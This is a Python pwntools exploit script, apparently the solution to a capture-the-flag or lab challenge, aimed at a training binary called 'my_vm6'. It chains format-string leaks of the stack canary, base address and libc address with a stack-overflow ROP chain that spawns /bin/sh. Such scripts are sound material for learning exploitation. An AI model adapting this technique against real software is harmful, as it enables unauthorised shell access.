#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

import sys


class bcolors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"


# Set up pwntools for the correct architecture
exe = context.binary = ELF(sys.argv[1] or "../ref/bin/my_vm6")
libc = ELF(exe.libc.path)


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# GDB script for debugging
gdbscript = """
b *vuln_function+771
c
c
c
c
x/180gx $rsp
""".format(
    **locals()
)


def leak_address(io, position: int) -> int:
    """
    Leaks an address through PRINTS and a format specifier
    """
    io.sendline(f"PRINTS %{position}$p".encode())
    io.sendline(b"EXEC")

    address = io.recvline_regex(b"0x[0-9a-f]+")

    return int(address, 16)


def print_address(name: str, address: str) -> None:
    """
    Pretty-print an address
    """
    print(
        f"{bcolors.BOLD}[{bcolors.OKGREEN}*{bcolors.ENDC}{bcolors.BOLD}]{bcolors.ENDC} {bcolors.OKGREEN}{name}{bcolors.ENDC} : {hex(address)}{bcolors.ENDC}"
    )


def main():
    # Those are the numbers of format specifiers we
    # need to leak addresses (inspected manually)
    LEAK_CANARY_OFFSET = 43
    LEAK_BASEADDR_OFFSET = 45
    LEAK_RBP_OFFSET = 44

    BYTES_TO_OVERFLOW = 264

    io = start()

    # Resolve canary address
    canary = leak_address(io, LEAK_CANARY_OFFSET)
    print_address("Canary", canary)

    # Resolve base address
    # 1. leak address of vuln_function
    # 2. calculate base address (should end in 000)
    base_address = leak_address(io, LEAK_BASEADDR_OFFSET)  # vuln_function
    base_address -= exe.sym["exec_instructions"] + BYTES_TO_OVERFLOW  # symbol + leaked

    exe.address = base_address
    print_address("Base address", base_address)

    # Resolve pwn_func address
    pwn_func = exe.symbols["pwn_func6"]
    print_address("pwn_func()", pwn_func)

    # Resolve RBP address
    rbp = leak_address(io, LEAK_RBP_OFFSET)
    print_address("RBP address", rbp)

    # Resolve libc address
    # 1. Get print address from GOT
    printf_address = exe.got["printf"]
    print_address("printf() address", printf_address)

    # 2. Leak dereferenced address through %s fmt specifier
    rop = ROP(exe)

    rop.raw(b"PRINTS ___%40$s")
    rop.raw(rop.generatePadding(0, BYTES_TO_OVERFLOW - 32))
    rop.raw(p64(printf_address))
    rop.raw(rop.generatePadding(0, 8))

    payload = rop.chain()

    io.sendline(payload)
    io.sendline(b"EXEC")

    # 3. get the leaked address
    io.recvuntil(b"___")  # consumes the buffer
    io.recvline()
    io.recvuntil(b"___")

    printf_dereferenced = u64(io.recv(6) + b"\x00\x00")
    print_address("printf@GLIBC_2.2.5 address", printf_dereferenced)

    # 4. Resolve libc address through our computed offset
    libc_baseaddr = printf_dereferenced - libc.sym["printf"]

    libc.address = libc_baseaddr
    print_address("libc base address", libc_baseaddr)

    # Execute payload
    rop = ROP(libc)

    rop.raw(b"PRINTS ")  # instruction
    rop.raw(rop.generatePadding(0, BYTES_TO_OVERFLOW))  # padding to overflow
    rop.raw(p64(canary))  # override canary
    rop.raw(p64(rbp))  # override RBP
    rop.raw(rop.ret)  # align stack
    rop.raw(rop.rdi.address)  # ROP gadget => pop rdi; ret
    rop.raw(p64(rbp + (8 + 8 + 8 + 64 + 8 + 8 + 8)))  # = (char**)$"/bin/sh" address
    rop.raw(pwn_func)  # ROP
    rop.raw(rop.generatePadding(0, 64))  # padding to not be overrided
    rop.raw(b"/bin/sh\x00")  # executable path
    rop.raw(p64(rbp + (8 + 8 + 8 + 64 + 8 + 8)))  # = (char*)$"/bin/sh"
    rop.raw(p64(0))  # null byte array terminator

    payload = rop.chain()

    io.sendline(payload)
    io.sendline(b"EXEC")

    io.interactive()


main()
